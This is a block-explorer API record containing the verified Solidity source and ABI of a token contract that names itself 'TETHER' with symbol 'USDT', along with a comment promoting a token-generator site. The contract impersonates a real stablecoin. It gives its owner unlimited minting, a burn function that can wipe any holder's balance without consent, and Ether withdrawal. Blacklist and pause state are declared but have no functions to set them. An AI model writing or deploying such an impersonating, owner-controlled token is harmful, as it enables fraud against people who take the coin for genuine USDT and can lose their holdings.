{
  "TxHash": "0xf04751d9bdd0d6838a72720cbe32e5a8672bd17a9ba6df9d4e5a68d09b71dcf0",
  "ContractAddress": "0x8696f3Fa1708B342824888411e7202D66EDDAE29",
  "Name": "ERC20",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "// SPDX-License-Identifier: MIT\r\n    pragma solidity \u003e=0.8.20 \u003c0.9.0;\r\n\r\n    interface IERC20 {\r\n      function totalSupply() external view returns (uint256);\r\n      function balanceOf(address account) external view returns (uint256);\r\n      function transfer(address recipient, uint256 amount) external returns (bool);\r\n      function allowance(address owner, address spender) external view returns (uint256);\r\n      function approve(address spender, uint256 amount) external returns (bool);\r\n      function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n      event Transfer(address indexed from, address indexed to, uint256 value);\r\n      event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    }\r\n\r\n    /*\r\n    \r\n    This contract was developed by expert developers at satoshiturk.com.\r\n    For more information, visit satoshiturk.com.\r\n    https://satoshiturk.com\r\n\r\n    token generator site\r\n    https://ioriti.com\r\n\r\n    */\r\n\r\n    contract ERC20 is IERC20 {\r\n      string public name;\r\n      string public symbol;\r\n      uint8 public decimals;\r\n      uint256 private _totalSupply;\r\n\r\n      mapping(address =\u003e uint256) private _balances;\r\n      mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n      mapping(address =\u003e bool) private _blacklist;\r\n      mapping(address =\u003e bool) private _whitelist;\r\n\r\n      bool private _reentrancyGuard;\r\n      bool private _paused;\r\n      address private _owner;\r\n\r\n      event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n      event EtherDeposited(address indexed from, uint256 value);\r\n      event EtherWithdrawn(address indexed to, uint256 value);\r\n      event Blacklisted(address indexed account);\r\n      event Whitelisted(address indexed account);\r\n      event RemovedFromBlacklist(address indexed account);\r\n      event RemovedFromWhitelist(address indexed account);\r\n      event Paused(address account);\r\n      event Unpaused(address account);\r\n\r\n      constructor() {\r\n        name = \"TETHER\";\r\n        symbol = \"USDT\";\r\n        decimals = 18;\r\n        _totalSupply = 100000000000 * 10 ** uint256(decimals);\r\n        _balances[msg.sender] = _totalSupply;\r\n        _reentrancyGuard = false;\r\n        _paused = false;\r\n        _owner = msg.sender;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        emit OwnershipTransferred(address(0), msg.sender);\r\n      }\r\n\r\n      modifier noReentrancy() {\r\n        require(!_reentrancyGuard, \"ReentrancyGuard: reentrant call\");\r\n        _reentrancyGuard = true;\r\n        _;\r\n        _reentrancyGuard = false;\r\n      }\r\n\r\n      modifier whenNotPaused() {\r\n        require(!_paused, \"Pausable: paused\");\r\n        _;\r\n      }\r\n\r\n      modifier whenPaused() {\r\n        require(_paused, \"Pausable: not paused\");\r\n        _;\r\n      }\r\n\r\n      modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n      }\r\n\r\n      modifier onlyValidAddress(address account) {\r\n        require(account != address(0), \"ERC20: invalid address\");\r\n        _;\r\n      }\r\n\r\n      modifier onlySufficientBalance(address account, uint256 amount) {\r\n        require(_balances[account] \u003e= amount, \"ERC20: insufficient balance\");\r\n        _;\r\n      }\r\n\r\n      modifier onlySufficientAllowance(address owner, address spender, uint256 amount) {\r\n        require(_allowances[owner][spender] \u003e= amount, \"ERC20: insufficient allowance\");\r\n        _;\r\n      }\r\n\r\n      modifier notBlacklisted(address account) {\r\n        require(!_blacklist[account], \"ERC20: account is blacklisted\");\r\n        _;\r\n      }\r\n\r\n      function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n      }\r\n\r\n      function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n      }\r\n\r\n      function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        noReentrancy\r\n        onlyValidAddress(recipient)\r\n        onlySufficientBalance(msg.sender, amount)\r\n        notBlacklisted(msg.sender)\r\n        notBlacklisted(recipient)\r\n        whenNotPaused\r\n        returns (bool)\r\n      {\r\n        _balances[msg.sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n      }\r\n\r\n      function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n      }\r\n\r\n      function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        noReentrancy\r\n        onlyValidAddress(spender)\r\n        returns (bool)\r\n      {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n      }\r\n\r\n      function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n      )\r\n        public\r\n        override\r\n        noReentrancy\r\n        onlyValidAddress(sender)\r\n        onlyValidAddress(recipient)\r\n        onlySufficientBalance(sender, amount)\r\n        onlySufficientAllowance(sender, msg.sender, amount)\r\n        notBlacklisted(sender)\r\n        notBlacklisted(recipient)\r\n        whenNotPaused\r\n        returns (bool)\r\n      {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n      }\r\n\r\n      function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        noReentrancy\r\n        onlyValidAddress(spender)\r\n        returns (bool)\r\n      {\r\n        _allowances[msg.sender][spender] += addedValue;\r\n        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);\r\n        return true;\r\n      }\r\n\r\n      function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        noReentrancy\r\n        onlyValidAddress(spender)\r\n        returns (bool)\r\n      {\r\n        uint256 currentAllowance = _allowances[msg.sender][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n\r\n        _allowances[msg.sender][spender] = currentAllowance - subtractedValue;\r\n        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);\r\n        return true;\r\n      }\r\n\r\n      \r\n      function mint(address account, uint256 amount)\r\n        public\r\n        noReentrancy\r\n        onlyOwner\r\n        onlyValidAddress(account)\r\n      {\r\n        _totalSupply = _safeAdd(_totalSupply, amount);\r\n        _balances[account] = _safeAdd(_balances[account], amount);\r\n        emit Transfer(address(0), account, amount);\r\n      }\r\n\r\n      \r\n      function burn(address account, uint256 amount)\r\n        public\r\n        noReentrancy\r\n        onlyOwner\r\n        onlyValidAddress(account)\r\n        onlySufficientBalance(account, amount)\r\n      {\r\n        _balances[account] = _safeSub(_balances[account], amount);\r\n        _totalSupply = _safeSub(_totalSupply, amount);\r\n        emit Transfer(account, address(0), amount);\r\n      }\r\n\r\n      \r\n\r\n      \r\n\r\n      \r\n\r\n      \r\n\r\n      function _safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"ERC20: addition overflow\");\r\n        return c;\r\n      }\r\n\r\n      function _safeSub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003c= a, \"ERC20: subtraction underflow\");\r\n        return a - b;\r\n      }\r\n\r\n      \r\n        receive() external payable {\r\n          emit EtherDeposited(msg.sender, msg.value);\r\n        }\r\n\r\n        function withdrawEther(address payable recipient, uint256 amount)\r\n        public\r\n        noReentrancy\r\n        onlyOwner\r\n        onlyValidAddress(recipient)\r\n        {\r\n          require(address(this).balance \u003e= amount, \"Insufficient balance in contract\");\r\n          (bool success, ) = recipient.call{value: amount}(\"\");\r\n          require(success, \"Transfer failed.\");\r\n          emit EtherWithdrawn(recipient, amount);\r\n        }\r\n    }",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Blacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"EtherDeposited\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"EtherWithdrawn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"RemovedFromBlacklist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"RemovedFromWhitelist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Whitelisted\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "ERC20",
      "CompilerVersion": "v0.8.26+commit.8a97fa7a",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://f18593505a8413f5b0d202c9c3bb7b825f6e0a6f896a399128231817332b308a"
    }
  ]
}
